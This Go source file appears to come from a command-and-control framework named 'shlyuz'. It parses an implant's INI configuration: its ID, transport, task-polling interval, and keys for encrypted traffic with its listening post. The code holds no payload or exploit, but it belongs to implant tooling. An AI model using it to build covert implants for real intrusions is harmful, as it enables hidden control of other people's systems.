//go:build implant || testing

package vzhivlyatconfig

import (
	"log"
	"strconv"

	"shlyuz/pkg/config"
	"shlyuz/pkg/crypto/asymmetric"
	"shlyuz/pkg/encoding/hex"

	"gopkg.in/ini.v1"
)

// Parses a given config from bytes
func ParseConfig(configToParse []byte) config.ShlyuzConfig {
	// TODO: Parse Transport Configuration - #? TransportConfig
	var ParsedConfig config.ShlyuzConfig
	cfg, err := ini.Load(configToParse)
	if err != nil {
		log.Fatalln("failed to load config: ", err)
	}
	vzhivlyatSec, err := cfg.GetSection("vzhivlyat")
	if err != nil {
		log.Fatalln("failed to read config section: ", err)
	}

	ParsedConfig.Id = vzhivlyatSec.Key("id").String()
	ParsedConfig.InitSignature = []byte(vzhivlyatSec.Key("init_signature").String())
	ParsedConfig.TransportName = vzhivlyatSec.Key("transport_name").String()
	ParsedConfig.TskChkTimer, err = strconv.Atoi(vzhivlyatSec.Key("task_check_time").Value())
	if err != nil {
		log.Fatalln("failed to parse config value timer: ", err)
	}

	cryptoSec, err := cfg.GetSection("crypto")
	if err != nil {
		log.Fatalln("failed to read config section 2: ", err)
	}
	compPrivKey := (*[32]byte)(hex.Decode([]byte(cryptoSec.Key("priv_key").Value())))
	ParsedConfig.CryptoConfig.CompKeyPair.PrivKey = (*[32]byte)(compPrivKey)
	ParsedConfig.CryptoConfig.CompKeyPair.PubKey = *asymmetric.PubFromPriv(ParsedConfig.CryptoConfig.CompKeyPair.PrivKey)
	lpPubKey := (*[32]byte)(hex.Decode([]byte(cryptoSec.Key("lp_pk").Value())))
	ParsedConfig.CryptoConfig.PeerPk = (*[32]byte)(lpPubKey)
	ParsedConfig.CryptoConfig.SymKey = []byte(cryptoSec.Key("sym_key").Value())
	xor64Key, err := strconv.ParseInt(cryptoSec.Key("xor_key").Value(), 0, 64)
	if err != nil {
		log.Fatalln("failed to parse config value xkey: ", err)
	}
	ParsedConfig.CryptoConfig.XorKey = int(xor64Key)

	return ParsedConfig
}
